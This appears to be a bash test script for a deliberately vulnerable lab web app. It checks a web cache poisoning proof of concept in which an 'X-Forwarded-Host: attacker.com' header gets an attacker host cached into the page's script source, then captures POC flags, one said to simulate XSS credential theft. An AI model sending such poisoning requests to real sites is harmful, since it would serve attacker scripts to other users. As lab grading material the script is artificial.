#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
sleep 3

PASS=0; FAIL=0

check() {
    local label="$1" result="$2"
    if [ "$result" = "1" ]; then echo "[PASS] $label"; PASS=$((PASS+1))
    else echo "[FAIL] $label"; FAIL=$((FAIL+1)); fi
}

until nc -z -w2 127.0.0.1 8094 2>/dev/null; do sleep 1; done

# Test 1: normal /home request uses real host, cache MISS
OUT=$(curl -s -D - http://127.0.0.1:8094/home 2>/dev/null)
check "normal /home returns MISS" "$( echo "$OUT" | grep -qi 'X-Cache: MISS' && echo 1 || echo 0 )"
check "normal /home uses real host in script_src" "$( echo "$OUT" | grep -q '127.0.0.1' && echo 1 || echo 0 )"

# Test 2: second /home without injected header should be HIT (cached)
OUT=$(curl -s -D - http://127.0.0.1:8094/home 2>/dev/null)
check "repeated /home without injection is cache HIT" "$( echo "$OUT" | grep -qi 'X-Cache: HIT' && echo 1 || echo 0 )"

# Test 3: clear cache and poison it
curl -s -X POST http://127.0.0.1:8094/cache/clear -H "Content-Type: application/json" -d '{}' > /dev/null 2>&1

OUT=$(curl -s -D - \
    -H "X-Forwarded-Host: attacker.com" \
    http://127.0.0.1:8094/home 2>/dev/null)
check "poisoning request is cache MISS" "$( echo "$OUT" | grep -qi 'X-Cache: MISS' && echo 1 || echo 0 )"
check "poisoning request reflects attacker.com" "$( echo "$OUT" | grep -q 'attacker.com' && echo 1 || echo 0 )"
FLAG1=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "poisoning request returns flag1" "$( [ -n "$FLAG1" ] && echo 1 || echo 0 )"
[ -n "$FLAG1" ] && echo "    flag1=$FLAG1"

# Test 4: victim request (no injected header) gets poisoned response from cache
OUT=$(curl -s -D - http://127.0.0.1:8094/home 2>/dev/null)
check "victim /home is cache HIT" "$( echo "$OUT" | grep -qi 'X-Cache: HIT' && echo 1 || echo 0 )"
check "victim /home has poisoned attacker.com in body" "$( echo "$OUT" | grep -q 'attacker.com' && echo 1 || echo 0 )"

# Test 5: flag2 from /admin (simulates XSS credential theft)
OUT=$(curl -s http://127.0.0.1:8094/admin 2>/dev/null)
FLAG2=$(echo "$OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
check "admin returns flag2 when cache is poisoned" "$( [ -n "$FLAG2" ] && echo 1 || echo 0 )"
[ -n "$FLAG2" ] && echo "    flag2=$FLAG2"

$DC down

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
